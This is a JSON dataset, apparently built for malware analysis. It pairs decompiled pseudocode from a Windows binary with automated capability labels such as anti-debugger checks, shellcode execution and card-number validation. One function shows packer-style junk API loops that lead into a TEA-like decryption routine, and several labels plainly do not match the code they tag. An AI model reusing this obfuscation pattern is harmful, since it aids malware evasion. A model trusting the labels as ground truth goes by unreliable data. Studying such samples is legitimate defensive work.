{
    "00404239": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040433f: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00404344)\n// WARNING: Removing unreachable block (ram,0x00404373)\n// WARNING: Removing unreachable block (ram,0x0040434a)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404239(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405900(0x415798, 0x20);\n    fcn.00406ca1(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x800c20 != 1) {\n        *0x800c1c = 1;\n        *0x800c18 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x2f2c5ec);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x2f2c5e8);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.00406549();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.00406549();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x2f2c5ec);\n                        piVar2 = (*pcVar1)(*0x2f2c5e8);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x401238;\n            while (*(unaff_EBP + -0x1c) < 0x401244) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x401248;\n        while (*(unaff_EBP + -0x20) < 0x40124c) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00406bb0(8);\n    }\n    return;\n}\n",
        "token_count": 1020
    },
    "00407220": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00407220(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00406bb0(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0040785b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040785b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x417400 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.00406549();\n    var_14h = 0;\n    if (*0x8014f8 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x401e7c);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x401e70), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x004079b8;\n        *0x8014f8 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x401e60);\n        *0x8014fc = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x401e4c);\n        *0x801500 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x401e30);\n        *0x801508 = (*pcVar4)(uVar3);\n        if (*0x801508 != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x401e18);\n            *0x801504 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x801504 == var_18h) || (*0x801508 == var_18h)) {\ncode_r0x00407967:\n        if ((((*0x8014fc != var_18h) && (pcVar4 = (*pcVar6)(*0x8014fc),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x801500 != var_18h && (pcVar4 = (*pcVar6)(*0x801500),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x801504);\n        pcVar5 = (*pcVar6)(*0x801508);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x00407967;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x8014f8);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x004079b8:\n    fcn.00407bd5(unaff_EBX);\n    return;\n}\n",
        "token_count": 925
    },
    "00407bd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407bd5(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x417400) {\n        return;\n    }\n    *0x801648 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x80164c = &arg_8h;\n    *0x801588 = 0x10001;\n    *0x801530 = 0xc0000409;\n    *0x801534 = 1;\n    var_328h = *0x417400;\n    var_324h = *0x417404;\n    *0x80153c = unaff_retaddr;\n    *0x801614 = in_GS;\n    *0x801618 = in_FS;\n    *0x80161c = in_ES;\n    *0x801620 = in_DS;\n    *0x801624 = unaff_EDI;\n    *0x801628 = unaff_ESI;\n    *0x80162c = unaff_EBX;\n    *0x801630 = in_EDX;\n    *0x801634 = in_ECX;\n    *0x801638 = in_EAX;\n    *0x80163c = unaff_EBP;\n    *0x801640 = unaff_retaddr;\n    *0x801644 = in_CS;\n    *0x801650 = in_SS;\n    *0x801580 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00409065(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402244);\n    if (*0x801580 == 0) {\n        fcn.00409065(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 803
    },
    "00407d50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407d50(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x801250, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0040468a();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00404648(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0040c69d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c69d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405900(0x415a10, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0040469d();\n        *puVar2 = 0;\n        puVar2 = fcn.0040468a();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x2f2b4a8)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x2f2b4c0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040f05b(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0040468a();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0040469d();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040bfa0(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040c769();\n                goto code_r0x0040c760;\n            }\n        }\n        puVar2 = fcn.0040469d();\n        *puVar2 = 0;\n        puVar2 = fcn.0040468a();\n        *puVar2 = 9;\n        fcn.004058a9();\n    }\ncode_r0x0040c760:\n    fcn.00405945();\n    return;\n}\n",
        "token_count": 619
    },
    "0040f3a8": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0040f3a8(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == unaff_EDI) {\n        puVar1 = *((unaff_ESI >> 5) * 4 + 0x2f2b4c0) + 4 + (unaff_ESI & 0x1f) * 0x40;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.0040f0fa(unaff_ESI);\n    return;\n}\n",
        "token_count": 165
    },
    "00414ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00414ba0(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uStack40;\n    int32_t iStack32;\n    ushort uStack16;\n    uint uStack14;\n    uint uStack10;\n    uint uStack6;\n    ushort uStack2;\n    \n    iVar4 = *0x800b54;\n    iVar3 = *0x800b50;\n    iVar2 = *0x800b4c;\n    iVar1 = *0x800b48;\n    uStack40 = *param_1;\n    uVar5 = param_1[1];\n    iStack32 = 0x20;\n    do {\n        if (*0x2f2b07c == 0x1b) {\n            uStack16 = 0;\n            uStack14 = 0;\n            uStack10 = 0;\n            uStack6 = 0;\n            uStack2 = 0;\n            (*_sym.imp.KERNEL32.dll_SetLocalTime)(&uStack16);\n        }\n        *0x2f2ab64 = 0;\n        uVar5 = uVar5 - ((uStack40 >> 5) + iVar4 ^ uStack40 + 0xc6ef3720 ^ uStack40 * 0x10 + iVar3);\n        *0x2f2ab68 = 0xff6b3619;\n        *0x2f2ab6c = 0xffffffff;\n        if (*0x2f2b07c == 0x979) {\n            (*_sym.imp.KERNEL32.dll_LocalCompact)(0);\n            (*_sym.imp.KERNEL32.dll_CompareStringW)(0, 0, 0x4034f8, 0, 0x403438, 0);\n        }\n        uStack40 = uStack40 - (uVar5 * 0x10 + iVar1 ^ uVar5 + 0xc6ef3720 ^ (uVar5 >> 5) + iVar2);\n        fcn.00414b30();\n        iStack32 = iStack32 + -1;\n    } while (iStack32 != 0);\n    param_1[1] = uVar5;\n    *param_1 = uStack40;\n    return;\n}\n",
        "token_count": 527
    },
    "00414d00": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.00414d00(void)\n\n{\n    uint32_t uVar1;\n    \n    for (uVar1 = *0x2f2b07c >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        fcn.00414ba0();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "00414d30": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.00414d30(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t unaff_retaddr;\n    int32_t in_stack_00000038;\n    int32_t iVar9;\n    \n    fcn.0040eec0();\n    if (*0x2f2b07c == 0x422) {\n        fcn.00403d30(0, 0);\n        fcn.00403d30(0, 0x403684);\n        fcn.00403d25();\n        fcn.00403cf5(0);\n        fcn.00403d30(0x801868, 0x403694);\n        fcn.00403c61(0);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_SetLastError;\n    *0x2f2b07c = *0x2f2b07c + 0x38d6;\n    uVar7 = 0;\n    do {\n        if (uVar7 < 0x1c2a7) {\n            (*pcVar1)();\n        }\n    } while ((((uVar7 < 0x1ea072e8) || (unaff_retaddr == 0xacd468)) || (in_stack_00000038 == 0xad1ade0)) &&\n            (uVar7 = uVar7 + 1,  uVar7 < 0x8c6fd558));\n    *0x2f2ab60 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n    pcVar6 = _sym.imp.KERNEL32.dll_DnsHostnameToComputerNameA;\n    pcVar5 = _sym.imp.KERNEL32.dll_ResetEvent;\n    pcVar3 = _sym.imp.KERNEL32.dll_EnumCalendarInfoW;\n    pcVar1 = _sym.imp.KERNEL32.dll_EnumCalendarInfoA;\n    iVar9 = 0x962ae8;\n    uVar7 = *0x2f2b07c;\n    do {\n        if (uVar7 == 0xd) {\n            (*pcVar1)();\n            (*pcVar3)();\n            (*pcVar6)();\n            (*pcVar5)();\n            (*_sym.imp.KERNEL32.dll_PulseEvent)();\n            (*_sym.imp.KERNEL32.dll_GetComputerNameExW)();\n            (*_sym.imp.KERNEL32.dll_SearchPathW)();\n            (*_sym.imp.KERNEL32.dll_DeactivateActCtx)();\n            (*_sym.imp.KERNEL32.dll_TransactNamedPipe)();\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesA)();\n            (*_sym.imp.KERNEL32.dll_CreateMutexW)();\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileSectionNamesW)();\n            (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n            (*_sym.imp.KERNEL32.dll_GetDriveTypeA)();\n            uVar7 = *0x2f2b07c;\n        }\n        pcVar4 = _sym.imp.KERNEL32.dll_GetEnvironmentStringsW;\n        pcVar2 = _sym.imp.KERNEL32.dll__llseek;\n        iVar9 = iVar9 + -1;\n    } while (iVar9 != 0);\n    uVar8 = 0;\n    if (uVar7 != 0) {\n        do {\n            if (uVar7 == 0xfe) {\n                (*pcVar2)();\n            }\n            fcn.004149d0();\n            if (*0x2f2b07c == 0x29) {\n                (*pcVar4)();\n            }\n            uVar8 = uVar8 + 1;\n            uVar7 = *0x2f2b07c;\n        } while (uVar8 < *0x2f2b07c);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_AddAtomA;\n    if (uVar7 == 0x19c) {\n        (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)();\n        (*_sym.imp.KERNEL32.dll_SetCalendarInfoW)();\n        (*_sym.imp.KERNEL32.dll_lstrcmpA)();\n    }\n    pcVar3 = _sym.imp.USER32.dll_LoadMenuW;\n    iVar9 = 0x8dc;\n    do {\n        (*pcVar3)();\n        pcVar5 = _sym.imp.KERNEL32.dll_WaitForMultipleObjects;\n        iVar9 = iVar9 + -1;\n    } while (iVar9 != 0);\n    iVar9 = 0x25865;\n    do {\n        if (*0x2f2b07c == 0x15a) {\n            (*pcVar1)();\n            (*pcVar5)();\n        }\n        iVar9 = iVar9 + -1;\n    } while (iVar9 != 0);\n    *0x801868 = 0;\n    fcn.00414510();\n    fcn.00414d00();\n    fcn.004149b0();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetCurrentThreadId;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetConsoleAliasW;\n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleExA;\n    iVar9 = 0xdd7b3;\n    do {\n        if (*0x2f2b07c == 0x21) {\n            (*pcVar5)();\n            (*pcVar3)();\n            (*pcVar1)();\n        }\n        iVar9 = iVar9 + -1;\n    } while (iVar9 != 0);\n    fcn.00414b40();\n    *0x801869 = 0x73;\n    if (*0x2f2b07c == 0x58c) {\n        (*_sym.imp.KERNEL32.dll_FindNextFileA)();\n        (*_sym.imp.KERNEL32.dll_InterlockedCompareExchange)();\n        (*_sym.imp.KERNEL32.dll_CreateTimerQueue)();\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        (*_sym.imp.KERNEL32.dll_BackupSeek)();\n        (*_sym.imp.KERNEL32.dll_EnumResourceTypesW)();\n        (*_sym.imp.KERNEL32.dll_FindActCtxSectionStringA)();\n        (*_sym.imp.KERNEL32.dll_WaitForDebugEvent)();\n        (*_sym.imp.KERNEL32.dll_GetConsoleOutputCP)();\n        (*_sym.imp.KERNEL32.dll_OpenWaitableTimerA)();\n        fcn.00409070();\n        (*_sym.imp.KERNEL32.dll_SetDefaultCommConfigW)();\n        (*_sym.imp.KERNEL32.dll_OpenMutexA)();\n        (*_sym.imp.KERNEL32.dll_WriteConsoleInputA)();\n    }\n    fcn.004149c0();\n    return 0;\n}\n",
        "token_count": 1486
    },
    "00403d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00403d30(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.00405900(0x415758, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.0040468a();\n        *puVar1 = 0x16;\n        fcn.004058a9();\n    }\n    else {\n        iVar2 = fcn.004047e3();\n        fcn.004048fb(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.004047e3();\n        arg_8h_00 = fcn.00404998(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.004047e3();\n        uVar4 = fcn.00404b25(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.004047e3();\n        fcn.00404a34(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00403dc4();\n    }\n    fcn.00405945();\n    return;\n}\n",
        "token_count": 444
    },
    "00403dc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403dc4(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004047e3();\n    fcn.00404969(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 54
    },
    "00403dd7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403dd7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00405ba4(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 54
    },
    "00403df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403df0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00405bc1(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 54
    },
    "00403e09": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e09(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00405bc1(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 46
    },
    "00403e21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e21(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00405bde(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 54
    },
    "00403e3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e3a(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00405bde(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 47
    },
    "00404379": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404379(uint arg_8h)\n\n{\n    fcn.00404239(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "00405b1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00405b1f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405900(0x4157b8, 0x10);\n    iVar1 = fcn.004047e3();\n    iVar1 = iVar1 + 0x20;\n    *(unaff_EBP + -0x1c) = iVar1;\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar2 = fcn.0040468a();\n        *puVar2 = 0x16;\n        fcn.004058a9();\n    }\n    else {\n        fcn.004048ba(iVar1);\n        *(unaff_EBP + -4) = 0;\n        arg_8h_00 = fcn.00404998(iVar1);\n        uVar3 = (**(unaff_EBP + 8))(iVar1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar3;\n        fcn.00404a34(arg_8h_00, iVar1);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00405b9c();\n    }\n    fcn.00405945();\n    return;\n}\n",
        "token_count": 427
    },
    "00405ba4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ba4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00405b1f(fcn.00404b25, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 62
    },
    "00405bc1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bc1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00405b1f(fcn.004092b6, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 62
    },
    "00405bde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bde(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00405b1f(fcn.0040a01f, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 63
    },
    "00405bfb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bfb(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00405b1f(fcn.00404b25, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "00405c17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c17(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00405b1f(fcn.004092b6, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "00405c33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c33(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00405b1f(fcn.0040a01f, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 55
    },
    "004064fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406511)\n// WARNING: Removing unreachable block (ram,0x00406517)\n// WARNING: Removing unreachable block (ram,0x00406519)\n\nvoid fcn.004064fd(void)\n\n{\n    return;\n}\n",
        "token_count": 60
    },
    "00414510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
